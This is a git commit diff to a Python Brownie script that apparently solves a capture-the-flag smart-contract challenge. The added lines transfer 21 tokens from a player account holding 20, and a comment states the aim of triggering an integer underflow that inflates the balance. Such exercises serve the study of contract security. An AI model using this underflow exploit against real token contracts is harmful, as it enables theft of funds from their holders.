5da9c6d1a9d533b425066f2b146b29c060830442
Andy <fei.andy.li@gmail.com>
2022-02-08 16:52:17 +0800

    token

--- scripts/deploy_token.py
+++ scripts/deploy_token.py
@@ -3,9 +3,16 @@ from brownie import Token, network, config,accounts
 def main():
     #input the contract address
     #> contract.address
-    contractAddress = '0xc67E60E767C61E84d9385260b0d3fe6388ad676d'
+
+    contractAddress = '0xd6860e7ecC7A1Cf5E2a150Db4C84Ea41F6840038'
 
     #use player account
     player = accounts.add(config["wallets"]["from_key"])
 
     contract = Token.at(contractAddress)
+
+    print("player balance is: " + str(contract.balanceOf(player)))
+    #the player has 20 tokens
+    print("transfer 21 tokens to contract address to cause underflow")
+    contract.transfer(contract.address,21,{"from":player})
+    print("player balance is: " + str(contract.balanceOf(player)))
